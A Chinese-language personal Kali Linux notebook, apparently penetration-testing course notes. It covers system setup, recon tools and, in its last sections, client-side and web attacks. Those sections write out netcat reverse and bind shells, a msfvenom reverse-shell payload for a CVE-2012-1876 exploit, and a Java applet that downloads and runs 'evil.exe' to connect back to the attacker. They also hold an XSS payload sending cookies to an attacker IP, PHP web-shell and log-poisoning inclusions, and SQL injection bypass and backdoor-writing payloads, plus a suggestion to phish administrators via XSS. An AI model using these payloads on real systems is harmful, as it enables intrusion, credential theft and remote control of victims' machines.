# kali 安装

## 官网下载

https://www.kali.org/downloads/


## 安装vmtools

tar zxvf vmtools.tar.gz -C /root
cd /root/wmtools/
./vmware-install.pl


## 安装virtualbox additions

mkdir /media/VBox
ls /media/VBox/
mount /dev/sr0 /media/VBox/
cd /media/VBox/
ls
sh VBoxLinuxAdditions.run


## 安装kali到安卓

linux deploy ssh vnc 安装
设置源ip:   http://202.141.160.110/kali 连接配置安装软件即可



# Kali set

## 安装英伟达显卡驱动(物理机)

### 官方教程

网址:
https://docs.kali.org/general-use/install-nvidia-drivers-on-kali-linux

apt update && apt dist-upgrade -y && reboot
lspci -v
apt install -y ocl-icd-libopencl1 nvidia-driver nvidia-cuda-toolkit
nvidia-smi              //验证是否安装成功
hashcat -I              //确保是否能和hashcat协同工作
hashcat -b

如若不成功,进行故障排除:
apt install -y clinfo
dpkg -l |grep -i icd

如果安装了mesa-opencl-icd:
apt remove mesa-opencl-icd

clinfo | grep -i "icd loader"
nvidia-smi -i 0 -q      //查看详细信息

确认3D渲染是否启用:
glxinfo | grep -i "direct rendering"
direct rendering: Yes   //出现yes成功


### 第二种方法

apt-get update
apt-get dist-upgrade
apt-get install -y linux-headers-$(uname -r)
apt-get install nvidia-kernel-dkms
sed 's/quiet/quiet nouveau.modeset=0/g' -i /etc/default/grub
update-grub
reboot

检测是否安装成功:
glxinfo | grep -i "direct rendering"
direct rendering: Yes       //出现yes安装成功

检测原本的Oclhashcat-plus是否运行正常:
cd /usr/share/oclhashcat-plus/
./cudaHashcat-plus.bin -t 32 -a 7 example0.hash ?a?a?a?a example.dict


## kali gnome桌面

安装:
apt-get install gnome-core kali-defaults kali-root-login desktop-base

卸载：
apt-get remove gnome-core

查看gnome版本:
gnome-shell --version

安装GNOME Shell 扩展：
apt-get install gnome-tweak-tool

安装chrome-gnome-shell:
apt-get install chrome-gnome-shell

安装系统监视器扩展:
apt-get install gir1.2-gtop-2.0 gir1.2-nm-1.0 gir1.2-clutter-1.0

重启gnome桌面:
alt+f2 输入r 回车

浏览器安装地址:
https://extensions.gnome.org/extension/120/system-monitor/

安装具体教程:
https://github.com/paradoxxxzero/gnome-shell-system-monitor-applet


## apt配置

配置软件源:
nano /etc/apt/sources.list

kali官方源:
deb http://http.kali.org/kali kali-rolling main non-free contrib
deb-src http://http.kali.org/kali kali-rolling main non-free contrib

东软大学源:
deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib
deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib

更新源:
apt-get update

对软件进行一次整体更新：
apt-get update & apt-get upgrade
apt-get dist-upgrade
apt-get clean

更新指定软件:
eg ：更新NMAP到最新版本
获取当前NMAP版本:

nmap --version

更新NMAP软件:

apt-get install nmap

再次获取当前NMAP版本号:

nmap --version

卸载不需要的软件包:
apt autoremove


## 其他设置

### 熄屏时间

设置-power-空白屏幕

### 添加快捷键

设置-设备-Keyboard-添加快捷键-名称(打开终端)-命令(gnome-terminal)-快捷键(ctrl+t)

### 更改终端字体及样式

右上角-设置文件首选项

### 更改左侧图标栏

右击最下方的显示所有应用程序按钮-dash to dock设置

### 修改时区

cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime

### 安装进程占用

rm /var/cache/apt/archives/lock
rm /var/lib/dpkg/lock

### ssh服务配置

nano /etc/ssh/sshd_config

```
#PermitRootLogin prohibit-password
PermitRootLogin yes

#PasswordAuthentication yes
PasswordAuthentication yes
```
或者
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config

/etc/init.d/ssh start                                       (启动ssh服务)
update-rc.d ssh enable                                      (设为开机自启)

### 安装pip

apt-get install python-setuptools
easy_install pip

wget https://bootstrap.pypa.io/get-pip.py
python3 get-pip.py


## 常用软件安装

### 安装谷歌输入法

apt-get update && apt-get upgrade
apt-get install fcitx
apt-get install fcitx-googlepinyin
reboot
所有应用程序中选中fcitx输入法配置即可


### 4.0中文乱码

dpkg-reconfigure locales
空格是选择,Tab是切换,*是选中
选中en_US.UTF-8和zh_CN.UTF-8,确定后,将zh_CN.UTF-8选为默认,然后安装中文字体
apt-get install xfonts-intl-chinese
apt-get install fonts-wqy-microhei
reboot


### 代理

proxychains:
nano /etc/proxychains.conf
ip port
proxychains curl https://www.google.com.hk (验证是否配置成功)

git代理的设置和取消:
git config --global http.proxy 'socks5://ip:port'
git config --global https.proxy 'socks5://ip:port'
git config --global --unset http.proxy
git config --global --unset https.proxy

安装ssr:
https://github.com/the0demiurge/CharlesScripts/blob/master/charles/bin/ssr      (获取最新版脚本)
mv ssr /usr/bin
chmod 755 /usr/bin/ssr                                                          (将ssr添加到bin目录下)
ssr help                                                                        (显示帮助信息)
ssr install                                                                     (安装ssr)
ssr config                                                                      (配置ssr,实际上编辑的是 /usr/local/share/shadowsocksr/config.json)
ssr start
ssr stop
ssr uninstall                                                                   (相关参数)


### ncat的安装和配置

apt install ncat
update-alternatives --config nc
1

### 安装libreoffice

apt-get install libreoffice

### 安装mantra

apt-get install owasp-mantra-ff

### 安装vega

apt-get install vega

### 安装openvas
文章:   https://blog.csdn.net/zgy956645239/article/details/87229331


### 安装jdk

自行下载 [oracle jdk](https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html)

这里以 `jdk-8u231-linux-x64.tar.gz` 举例

```bash
tar -xzvf jdk-8u231-linux-x64.tar.gz
mv jdk1.8.0_231/ /usr/local/lib/jvm/
cd /usr/local/lib/
mv jvm jdk
mv jdk jdk1.8
export JAVA_HOME=/usr/local/lib/jdk1.8/
export JRE_HOME=JAVAHOME/jreexportCLASSPATH=.:{JAVA_HOME}/lib:JREHOME/libexportPATH={JAVA_HOME}/bin:$PATH
update-alternatives --install /usr/bin/java java /usr/local/lib/jdk1.8/bin/java 1
update-alternatives --install /usr/bin/javac javac /usr/local/lib/jdk1.8/bin/javac 1
update-alternatives --set java /usr/local/lib/jdk1.8/bin/java
update-alternatives --set javac /usr/local/lib/jdk1.8/bin/javac
```



# kali linux基础知识

## find files

找特定文件:
updatedb(更新库)
locate 文件名

找可执行程序:
which 程序名

找所有名字带有sdb的文件:
find / -name sdb*
find / -name sdb* -exec file {} \;      查看找到结果文件的格式

重启网卡:
service networking restart


## services in kail

### ssh

service ssh start
netstat -antp |grep sshd
service ssh stop

若ssh连接某个机器时,出错,且返回their offer:xxxx 字样,使用其中一种尝试连接:
ssh -c xxxx connect-ip

### http

service apache2 start
http://127.0.0.1/
/var/www/index.html                     默认主页
service apache2 stop

### 路径启动

/etx/init.d/ssh(服务名) start

### 设置服务开机自启

upadte-rc.d ssh enable
rcconf


## bash shell

### 示例1

wget www.cisco.com
cat index.html |grep "href=" |cut -d"/" -f3 |grep "cisco\.com" |cut -d '"' -f1 |sort -u
grep -o '[A-Za-z0-9_\.-]*\.*cisco.com' index.html |sort -u >cisco.txt

host www.cisco.com |grep "has address" |cut -d" " -f4

```cisco.sh
#!/bin/bash

for url in $(cat cisco.txt) ;do
host $url |grep "has address" |cut -d" " -f4
done
```

for url in $(grep -o '[A-Za-z0-9_\.-]*\.*cisco.com' index.html |sort -u) ; do host $url |grep "has address" |cut -d" " -f4;done

### 示例2

ipconfig tap0

```ping-loop.sh
#!/bin/bash

for ip in $(seq 200 210) ; do
ping -c 1 192.168.31.$ip |grep "bytes from" |cut -d" " -f4 |cut -d ":" -f1 &
done
```


## cheatsheets

all:
http://pentestmonkey.net/category/cheat-sheet        

https://github.com/swisskyrepo/PayloadsAllTheThings

tty escape:    
 https://netsec.ws/?p=337



# kali 信息收集

robots.txt文件

whois

netdiscover -i eth0     查找eth0网卡同ip段的主机

## google hack

site:"microsoft.com" -site:"www.microsoft.com"
site:"microsoft.com" filetype:ppt "penetration testing"
intitle:"VNC viewer for java"
inurl:"/control/userimage.html"
inurl:.php? intext:CHARACTER_SETS,COLLATIONS intitle:phpmyadmin
intitle:"-N3t" filetype:php undetectable

GHDB:   https://www.exploit-db.com/google-hacking-database


## DNS收集

### dnsrecon

|options                                                |说明
|-------------------------------------------------------|---------
|-h                                                     |打印帮助信息并退出
|-d <domain>                                            |目标域名
|-r <range>                                             |对给定格式的IP范围进行爆破，格式为(开始IP-结束IP)或(范围/掩码)
|-n <name>                                              |指定一个域名服务器
|-D <file>                                              |用来爆破的子域名与主机名字典文件
|-f                                                     |在保存结果时忽略枚举域查找结果
|-a                                                     |在标准枚举过程中进行空间域传送测试
|-s                                                     |在标准枚举过程中进行IP地址范围的反向查找
|-g                                                     |在标准枚举的过程中进行Google枚举
|-w                                                     |在标准枚举的过程中进行深度whois查询和IP反查
|-z                                                     |在标准枚举的过程中进行DNSSEC域漫游
|--threads <number>                                     |指定线程数
|--lifetime <number>                                    |指定查询等待的时间
|--db <file>                                            |将结果存储为sqlite3数据库的文件
|--xml <file>                                           |将结果存储为XML格式的文件
|--iw                                                   |即使发现了通配符也依然爆破
|-c <file>                                              |CSV格式的文件
|-j <file>                                              |json文件
|-v                                                     |显示爆破的过程
|-t <types>                                             |指定枚举类型


|枚举类型                                                |说明
|-------------------------------------------------------|-----
|std                                                    |如果NS服务器的域传送失败，进行SOA、NS、A、AAAA、MX 和 SRV的枚举(必须使用-d参数指定域|名才可使用此参数)
|rvl                                                    |对给定的IP范围或CIDR进行反向查找(必须使用-r指定IP范围)
|brt                                                    |使用指定的字典爆破域名与主机名
|srv                                                    |枚举SRV记录
|axfr                                                   |对所有的NS服务器进行域传送测试
|goo                                                    |对子域名和host进行Google搜索
|snoop                                                  |对-D选项给出的文件进行DNS服务器缓存侦测
|tld                                                    |删除给定域的TLD并测试在IANA中注册的所有的TLD
|zonewalk                                               |使用NSEC记录进行DNSSEC域漫游


### dnsenum

dnsenum <domain>                                        探测是否存在区域文件传输漏洞
-r                                                      设置递归查询
-w                                                      设置whois请求
-o                                                      指定输入文件
-enum                                                   会同时从谷歌解析该域名(需代理)

### fierce

fierce -dns baidu.com                                   获取子域名
--wordlist                                              指定字典

### host

host -t ns megacorpone.com                              查看域名对应的dns
host -t mx megacorpone.com                              查看域名对应的邮件地址
host www.megacorpone.com                                查看域名对应的ip
host idontexist.megacorpone.com                         查看不存在域名时的回显

```forward.sh
#!/bin/bash

for name in $(cat list.txt) ;do
        host $name.megacorpone.com|grep "has address" |cut -d" " -f1,4
done
```

```reverse.sh
#!/bin/bash

for ip in $(seq 72 91) ;do
        host 38.100.193.$ip |grep "megacorp" |cut -d" " -f1,5
done
```

host -l megacorpone.com ns1.megacorpone.com             查看是否存在区域文件传输漏洞

```zone-transfer.sh
#!/bin/bash

if [ ! "$1" ]; then
        echo "[*] Simple Zone transfer script"
        echo "[*] Usage    : $0 <domain name>"
        exit 0
fi

for server in $(host -t ns $1 |cut -d" " -f4) ;do
        host -l $1 $server |grep "has address"
done
```

### theharvester

|option                                                 |说明
|-------------------------------------------------------|-----------
|-l                                                     |限制并发搜索结果
|-b                                                     |指定搜索引擎(baidu,bing,bingapi,censys,crtsh,dogpile,google等等)
|-d                                                     |指定搜索对象
|-h                                                     |使用Shodan数据库去搜索主机
|-s                                                     |从结果X开始(默认为0)
|-v                                                     |通过DNS解析验证主机名,搜索虚拟主机
|-f                                                     |将结果保存到HTML和XML文件中
|-n                                                     |对发现的所有范围执行DNS反向查询
|-c                                                     |对域名进行DNS爆破
|-t                                                     |执行DNS TLD扩展发现

示例:
theharvester -d qq.com -l 500 -b baidu


## 端口扫描

### tcp

nc -nvv -w 1 -z 192.168.1.1 3385-3395


### udp

nc -unvv -w 1 -z 192.168.31.227 160-165


### nmap

cat /usr/share/nmap/nmap-services                                               查看nmap服务内容

```iptables-counters.sh
#!/bin/bash

# reset all counters and iptables rules
iptables -Z && iptables -F
# measure incoming traffic to 192.168.31.220
iptables -I INPUT 1 -s 192.168.31.220 -j ACCEPT
# measure outgoing traffic to 192.168.31.220
iptables -I OUTPUT 1 -d 192.168.31.220 -j ACCEPT
```
iptables -vn -L                                                                 查看结果

nmap -sn 192.168.31.200-254                                                     探测网段中存活的主机
nmap -sn 192.168.31.200-254 -oG ping-sweep-nmap                                 将存活主机保存至ping-sweep-nmap中
nmap -p 80 192.168.31.200-254 -oG web-sweep.txt                                 将网段中开放了80端口的主机保存到web-sweep.txt中
nmap -sT --top-ports 20 192.168.31.200-254 -oG top-port-sweep.txt               扫描存活主机的top-20-tcp端口存至top-port-sweep.txt中
nmap -A 192.168.31.220                                                          探测主机操作系统

nmap脚本:
ls -l /usr/share/nmap/scripts/                                                  查看nmap的所有脚本


### smb

探测网段中开放了smb服务的主机:
nmap -p 139,445 192.168.31.200-254 --open


#### smbclient

列出某个IP地址所提供的共享文件夹:
smbclient -L 198.168.0.1 -U username%passWord

像FTP客户端一样使用smbclient:
smbclient //192.168.0.1/tmp -U username%password
执行smbclient命令成功后,进入smbclient环境,出现提示符： smb：\>    这里有许多命令和ftp命令相似,如cd 、lcd、get、megt、put、mput等。通过这些命令,我们可以访问远程主机的共享资源。

直接使用smbclient命令(一次性),例,创建一个共享文件夹:
smbclient -c “mkdir share1” //192.168.0.1/tmp -U username%password


#### rpcclient

连接:
rpcclient -U username win-ip

文章:   https://www.iteye.com/blog/j4s0nh4ck-2158312

如果是null session,输入""作为username,然后输入密码,为空,直接按enter键
登录成功后命令行会出现如下显示:
rpcclient $>
help命令获得帮助,在极少的场合,rpcclient需要在/etc/hosts文件中添加目标才能工作

获得目标机器的版本:
rpcclient $> srvinfo
10.10.76.1 Wk Sv NT PtB
platform_id : 500
os version : 6.2
server type : 0x11003
获取成功后,通过链接     http://en.wikipedia.org/wiki/Comparison_of_Microsoft_Windows_versions   来查询版本,示例中得到的是6.2,所以是Windows8或Windows server 2012.

获得一些user:
输入enum,两次<tab><tab>

枚举user:
enumdomusers

查看密码规则:
getdompwinfo

枚举管理员组:
enumalsgroups domain

枚举内置组:
enumalsgroups builtin

使用lookupnames来查看一个完整的SID,示例(查看administrator帐号和administrators组):
rpcclient $> lookupnames administrators
administrators S-1-5-32-544 (Local Group: 4)
rpcclient $> lookupnames administrator
administrator S-1-5-21-728759338-17244630-2184799192-500 (User: 1)

lookupsids 命令将SID转换成username

queryuser命令来查看基于一个十进制RID的个体的细节:
rpcclient $> queryuser 500


#### enum4linux

使用示例:
enum4linux -v 192.168.1.1
enum4linux -a -o www.xxx.com

|枚举选项                                    |用法
|-------------------------------------------|----------
|-U                                         |获取用户列表
|-M                                         |获取机器列表*
|-S                                         |获取共享列表
|-P                                         |获取密码策略信息
|-G                                         |获取组和成员列表
|-d                                         |详述适用于-U和-S
|-u username                                |用户指定要使用的用户名(默认"")
|-p password                                |指定要使用的密码(默认为"")


|其他选项                                    |用法
|-------------------------------------------|-----------------
|-a                                         |做所有简单枚举(-U -S -G -P -r -o -n -i),如果您没有提供任何其他选项,则启用此选项
|-h                                         |显示此帮助消息并退出
|-r                                         |通过RID循环枚举用户
|-R range                                   |RID范围要枚举(默认值：500-550,1000-1050,隐含-r)
|-K n                                       |继续搜索RID,直到n个连续的RID与用户名不对应,Impies RID范围结束于999999.对DC有用
|-l                                         |通过LDAP 389 / TCP获取一些(有限的)信息(仅适用于DN)
|-s                                         |文件暴力猜测共享名称
|-k username                                |远程系统上存在的用户(默认值：administrator,guest,krbtgt,domain admins,root,bin,none),使用逗号尝试几个用户：“-k admin,user1,user2”
|-o                                         |获取操作系统信息
|-i                                         |获取打印机信息
|-w workgroup                               |手动指定工作组(通常自动找到)
|-n                                         |做一个nmblookup(类似于nbtstat)
|-v                                         |详细输出,显示正在运行的完整命令(net,rpcclient等)


#### nmap-nse

ls -l /user/share/nmap/scripts/|grep smb

nmap -p 139,445 --script smb-enum-users 192.168.31.206
nmap -p 139,445 --script=smb-check-vulns --script-args=unsafe=1 192.168.31.229


### smtp

nc -nv 192.168.31.215 25
VRFY bob                            存在bob用户时,返回250
VRFY idontexist                     不存在用户时,返回500

bash一句话,枚举smtp用户名:
for user in $(cat users.txt) ; do echo VRFY $user |nc -nv -w 1 192.168.31.215 25 2>/dev/null |grep ^"250";done

smtp爆破的py脚本
```vrfy.py
#!/usr/bin/python

import socket
import sys

if len(sys.argv) !=2:
        print "Usage:   vrfy.py <username>"
        sys.exit(0)

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.31.215',25))
banner=s.recv(1024)
print banner
s.send('VRFY '+ sys.argv[1] + '\r\n')
result=s.recv(1024)
print result
s.close()
```


### snmp

侦听端口udp: 161

默认community:
public
private
manager

常用mib-values:
1.3.6.1.2.1.25.1.6.0        System Processes
1.3.6.1.2.1.25.4.2.1.2      Running Programs
1.3.6.1.2.1.25.4.2.1.4      Processes Path
1.3.6.1.2.1.25.2.3.1.4      Storage Units
1.3.6.1.2.1.25.6.3.1.2      Software Name(甚至能看到补丁情况)
1.3.6.1.4.1.77.1.2.25       User Accounts
1.3.6.1.2.1.6.13.1.3        TCP Local Ports

snmp-mid值参照表:    http://www.net-snmp.org/docs/mibs/host.html#hrDeviceTable
全局oid参考数据库:    http://oidref.com/

#### nmap

```
nmap -sU --open -p 161 192.168.31.200-254 --open
```
#### onesixtyone

```
for ip in $(seq 200 254) ; do echo 192.168.31.$ip;done > ips

onesixtyone -c community.txt -i ips.txt -o my.log -w 100(延迟为100ms)

onesixtyone -d 160.231.17.100(显示详细信息)
```

#### snmpwalk

使用示例:
snmpwalk -c community -v1 ip oid(可选)
snmpwalk -c public -v1 192.168.31.227 1.3.6.1.2.1.25.4.2.1.2
ip：指定要walk的设备的IP地址,该参数必须有
oid：代表要获取设备的指标oid,该参数不是必须的,这里英文名和点分十进制数均可(hrSystemNumUsers与1.3.6.1.2.1.25.1.5是等效的)

|参数                                                        |用法
|-----------------------------------------------------------|-----------
|–h                                                         |显示帮助
|–v                                                         |指定snmp的版本,1或者2或者3,该参数必须有
|–c                                                         |指定community字符串,该参数必须有
|–V                                                         |显示当前snmpwalk命令行版本
|–r                                                         |指定重试次数,默认为0次
|–t                                                         |指定每次请求的等待超时时间,单为秒,默认为3秒
|–l                                                         |指定安全级别：noAuthNoPriv/authNoPriv/authPriv
|–a                                                         |验证协议：MD5/SHA,只有-l指定为authNoPriv/authPriv时才需要
|–A                                                         |验证字符串,只有-l指定为authNoPriv/authPriv时才需要
|–x                                                         |加密协议：DES,只有-l指定为authPriv时才需要
|–X                                                         |加密字符串,只有-l指定为authPriv时才需要


### nbtscan

工作原理(局域网):   遍历输入的IP范围,以广播MAC地址发送ARP查询,一旦接收到ARP回复,遍记录相应的IP与MAC地址,同时向对方发送NBNS消息查询对方的主机信息,打印出每条信息

用法:   `nbtscan 192.168.31.200-254`


## 主机漏洞扫描

### nmap-nse

nmap -v -p 80 --script http-vuln-cve2010-2861 192.168.31.210
nmap -v -p 80 --script all 192.168.31.210                           使用所有脚本进行扫描

### openvas

openvas-setup
安装完成后会生成一串密码
访问 https://127.0.0.1:9392 登录,账号: admin 密码是安装时生成的


## web漏洞扫描

### 目录探测

目录爆破:
dirb(命令行)、dirbuster(图形化)

目录爬行:
vega、netspider


### recon-ng

```
show modules
use xxx
show options
set source xxx.com
run
```


### 识别cms类型

whatweb -v 域名


### 识别硬件waf

wafw00f 域名



# 常用工具

## netcat

### tcp端口连接

smtp:
nc -nv 192.168.30.35 25
help

pop3:
nc -nv 192.168.30.35 110
user xxx
pass xxx

imap:
nc -nv 192.168.30.35 143

### chat

nc -nvlp 4444                                                       A主机
nc -nv 192.168.30.35 4444                                           B主机

### 文件传输

nc -nvlp 4444 > incoming.exe                                        A主机
nc -nv 192.168.30.35 4444 </usr/share/windows-binaries/wget.exe     kali

### bind shell

nc -lvp 4444 -e cmd.exe                                             Win(有公网ip)
nc -nv 192.168.30.35 4444                                           Kali(无公网ip)

### reverse shell

nc -lvp 4444                                                        Win(有公网ip)
nc -nv 192.168.30.35 4444 -e /bin/bash                              Kali(无公网ip)

ncat:

ncat lvp 4444 -e cmd.exe --allow 192.168.30.5 --ssl                   Win
ncat -v 192.168.30.35 4444 --ssl                                      B主机


## web工具

### w3af

./w3af_console          命令行
help                    查看帮助
audit                   漏扫模块
crawl web_spider        爬行模块
target                  设置目标
view                    查看选项
http-settings           http选项
set user_agent          设置user_agent
start

./w3af_gui              图形界面


### nikto

-h                      指定扫描的目标
-p                      端口
-C                      指定CGI目录
-all                    猜解CGI目录
-o                      指定输入结果
-useproxy               使用指定代理扫描
-update                 更新插件和数据库

-T                      包含很多选项,如-T 9表示扫描SQL注入
|option                 |用法
|-----------------------|-----
|0                      |检查文件上传页面
|1                      |检查web日志
|2                      |检查错误配置或默认文件
|3                      |检查信息泄露问题
|4                      |检查XSS/Script/HTML问题
|5                      |从根目录检查是否存在可访问的文件
|6                      |检查拒绝服务问题
|7                      |从任意文件检索是否存在可访问文件
|8                      |检查是否存在系统命令执行漏洞
|9                      |检查SQL注入漏洞
|a                      |检查认证绕过问题
|b                      |识别安装的软件版本
|c                      |检查源代码泄露问题
|x                      |反向链接选项


### 专门针对wordpress

#### plecost

|参数                                                                                |用法
|-----------------------------------------------------------------------------------|-------------
|-h                                                                                 |查看更多可用的选项和参数
|-v 目标域名 -o results.json                                                         |扫描结果输出为json后缀保存vun
|-v 目标域名 -o results.xml                                                          |扫描结果输出为xml格式保存
|-f 目标域名                                                                         |强制扫描,即使没有探测到wordpress
|-c 10 目标域名                                                                      |增加扫描并发量,但是可能导致目标站点关闭访问
|--update-cve                                                                       |更新漏洞库
|--update-plugins                                                                   |更新插件列表
|-nb --show-plugins                                                                 |查看已有的漏洞插件
|-nb -vp google_analytics                                                           |查看指定的具体插件的内容
|-nb --cve CVE-2014-9174                                                            |查看具体CVE的详细信息

https://hackertarget.com/100k-top-wordpress-powered-sites/                          在线的查找一些wordpress站点

plecost -i 插件列表.txt -s 12 -M 30 -t 20 -o 输出结果.txt 目标域名                    用法示例


#### wpscan

|参数                                                                                 |用法
|------------------------------------------------------------------------------------|---------------
|--version                                                                           |输出当前版本
|--update                                                                            |更新到最新版本
|-h                                                                                  |输出帮助信息
|--url     目标                                                                      |要扫描的wordpress站点
|-f                                                                                  |不检查网站运行的是不是wordpress
|--exclude-content-based "正则表达式或字符串"                                          |当使用枚举选项时,可以使用该参数做一些过滤,基于正则或者字符串,可以不写正则分隔符,但要用单引号或双引号包裹
|--c 配置文件路径                                                                     |使用指定的配置文件
|-a                                                                                  |指定user_agent
|--cookie                                                                            |指定cookie
|-r                                                                                  |使用随机user_agent
|--follow-redirection                                                                |如果目标包含一个重定向,则直接跟随跳转
|--batch                                                                             |无需用户交互,都使用默认行为
|--no-color                                                                          |不要采用彩色输出
|--wp-content-dir                                                                    |wpscan会去发现wp-content目录,用户可手动指定
|--wp-plugins-dir                                                                    |指定wp插件目录,默认是wp-content/plugins
|--proxy                                                                             |host:port设置一个代理,可以使用HTTP、SOCKS4、SOCKS4A、SOCKS5,如果未设置默认是HTTP协议
|--proxy-auth username:passwor                                                       |设置代理登陆信息
|--basic-auth username:password                                                      |设置基础认证信息
|-w  wordlist                                                                        |指定密码字典
|-U  username                                                                        |指定爆破的用户名
|--usernames path-to-file                                                            |指定爆破用户名字典
|-t  number of threads                                                               |指定多线程
|--cache-ttl cache-ttl                                                               |设置 cache TTL
|--request-timeout request-timeout                                                   |请求超时时间
|--connect-timeout connect-timeout                                                   |连接超时时间
|--max-threads max-threads                                                           |最大线程数
|--throttle milliseconds                                                             |当线程数设置为1时,设置两个请求之间的间隔
|-v                                                                                  |输出Verbose
|-e [option(s)]                                                                      |枚举,可以指定多个扫描选项,例:"-e tt,p" 如果没有指定选项,默认选项为:"vt,tt,u,vp"

u                               枚举用户名,默认从1-10                                 u[10-20]                             枚举用户名,配置从10-20
p                               枚举插件                                              vp                                   枚举有漏洞的插件
tt                              列举缩略图相关的文件                                   vt                                   枚举存在漏洞的主题

wpscan --url 目标 -W 字典路径 -U admin                                                   用法示例


### beef-xss

命令行打开后,去登录本地web端(端口号为3000),用户名密码均为beef
将它给的js地址留到XSS中,然后去本地web端,使用相应的模块利用
搭建一个存在xss漏洞的网址,发给管理员来钓鱼


## ettercap(arp/dns欺骗)

echo 1 > /proc/sys/net/ipv4/ip_forward              启用路由转发功能
nano /etc/ettercap/etter.conf                       将if you use iptables下的两句话前的#删掉(启用)
ettercap -T                                         纯命令行界面
ettercap -C                                         命令行中的图形界面
ettercap -G                                         纯图形化界面
nano /etc/ettercap/etter.dns                        在最下面添加你需要欺骗的条目即可



# 客户端攻击

## 示例: CVE-2012-1876

去 https://www.exploit-db.com/ 下载对应的exp

将bind shell替换成reverse shell:
msfvenom -p windows/shell_reverse_tcp lhost=your-ip lport=your-port -f js_le --platform windows -a x86 -e generic/none
发现生成的shell code长度为324个字节,小于原先exploit中的342个字节
用nop补足剩下的18个字节,即%u9090
然后当目标机访问exploit.html时,就会回连到我们的目标端口


## keytool

Keytool是一个Java数据证书的管理工具,这个工具一般在 JDK\jre\bin\security\目录下,所有的数字证书是以一条一条(采用别名区别)的形式存入证书库的中,证书库中的每个证书包含该条证书的私钥,公钥和对应的数字证书的信息

证书库中的一条证书可以导出数字证书文件,数字证书文件只包括主体信息和对应的公钥
Keytool将密钥(key)和证书(certificates)存在一个称为keystore的文件中

在keystore里,包含两种数据：
密钥实体(Key entity)— 密钥(secret key)又或者是私钥和配对公钥(采用非对称加密)
可信任的证书实体(trusted certificate entries)— 只包含公钥

|参数                           |说明
|-------------------------------|-----------------
|-genkeypair                    |创建一个新的密钥
|-keyalg                        |使用加密的算法,例:RSA(默认为"DSA")
|-alias　　　　　                |和keystore关联的别名,通常不区分大小写(默认为"mykey")
|-keypass                       |私有密钥的密码
|-keystore                      |指定密钥存储路径(默认为用户宿主目录中名为.keystore的文件)
|-storepass                     |存取密码,这里设置为changeit,这个密码提供系统从mykeystore文件中将信息取出
|-validity                      |该密钥的有效期,单位:天 (默认为90)
|-keysize                       |指定密钥长度(默认为1024)
|-list                          |显示密钥库中的证书信息
|-v                             |显示密钥库中的证书详细信息
|-delete                        |删除密钥库中某条目
|-import                        |将已签名数字证书导入密钥库
|-keypasswd                     |修改密钥库中指定条目口令
|-dname                         |密钥的Distinguished Names,表明了密钥的发行者身份

CN=commonName      注：生成证书时,CN要和服务器的域名相同,如果在本地测试,则使用localhost

OU=organizationUnit     O=organizationName      L=localityName      S=stateName     C=country


## java applets

```java.java
import java.applet.*;
import java.awt.*;
import java.io.*;
import java.net.URL;
import java.util.*;
import java.net.URL;

/*  This Java applet will download a file and execute it.   */

public class Java extends Applet {

    private Object initialized = null;
    public Object isInitialized()
    {
        return initialized;
    }
    public void init() {
        Process f;
        try {
            String tmpdir = System.getProperty("java.io.tmpdir") + File.separator;
            String expath = tmpdir + "evil.exe";
            String download = "";
            download = getParameter("1");
            if (download.length() > 0) {
                //URL parameter
                URL url = new URL(download);
                //Get an input stream for reading
                InputStream in = url.openStream();
                //Create a buffered input stream for efficency
                BufferedInputStream bufIn = new BufferedInputStream(in);
                File outputFile = new File(expath);
                OutputStream out = new BufferedOutputStream(new FileOutputStream(outputFile));
                byte[] buffer = new byte[2048];
                for (;;) {
                    int nBytes = bufIn.read(buffer);
                    if (nBytes <= 0) break;
                    out.write(buffer,0,nBytes);
                }
                out.flush();
                out.close();
                in.close();
                f = Runtime.getRuntime().exec("cmd.exe /c " + expath);
            }
        }
        catch(IOException e) {
            e.printStackTrace();
        }
        /* ended here and commented out below for bypass */
        catch (Exception exception)
        {
            exception.printStackTrace();
        }
    }
}
```
因为我们要让目标下载nc.exe并回连到我们的机器,修改上述代码:
f = Runtime.getRuntime().exec("cmd.exe /c" + expath + "192.168.30.5 4444 -e cmd.exe")

编译上述脚本:
```
javac java.java
echo "Permissions: all-permissions" > /root/manifest.txt
jar cvfm Java.jar /root/manifest.txt Java.class
keytool -genkey -alias signapplet -keystore mykeystore -keypass mykeypass -storepass password123
Haxor
Ownage
offsec
127.0.0.1
localhost
US
yes
/usr/local/lib/jdk1.8/bin/jarsigner -keystore mykeystore -storepass password123 -keypass mykeypass -signedjar SignedJava.jar Java.jar signapplet
cp Java.class SignedJava.jar /var/www/
echo '<applet width="1" height="1" id="Java Secure" code="Java.class" archive="SignedJava.jar"><param name="1" > value="http://192.168.30.5/evil.exe"></applet>' > /var/www/java.html
cp /usr/share/windows-binaries/nc.exe /var/www/evil.exe
```
攻击机侦听4444端口:
nc -lvp 4444
当目标机访问 http://192.168.30.5/java.html 时,若点确定则会回连到攻击机



# web应用攻击

## xss

在目标机留xss:  <iframe SRC="http://192.168.30.5:81/report" height = "0" width="0"></iframe>
攻击机侦听81端口:   nc -lvp 81
当目标触发xss时,会连接到攻击机的81端口

获取cookie的payload:    <script>new Image().src="http://192.168.30.5:81/bogus.php?output="+doucument.cookie;</script>


## php文件包含

```
echo '<?php echo shell_exec("ipconfig");?>' > /var/www/evil.txt
service apache2 start
tail -f /var/log/apache2/access.log
```
包含 http://192.168.30.5/evil.txt%00 即可看到执行命令的结果

进行远程文件包含时,需要:
allow_url_fopen = on
allow_url_include = on

若上述选项关闭,尝试本地文件包含:
nc -nv 192.168.30.35 80
<?php echo shell_exec($_GET['cmd']);?>
包含cmd=ipconfig&file=../../../apache/logs/access.log%00


## sql注入

认证绕过:
any' or 1=1 limit 1;#

检测注入:
-sleep(5)

文件读取:
union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6

文件写入:
union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'

sqlmap:
sqlmap -u http://192.168.30.35 --crawl=1                                            显示详细信息,适合初学者
sqlmap -u http://192.168.30.35/comment.php?id=738 --dbms=mysql --dump --threads=5   dump数据
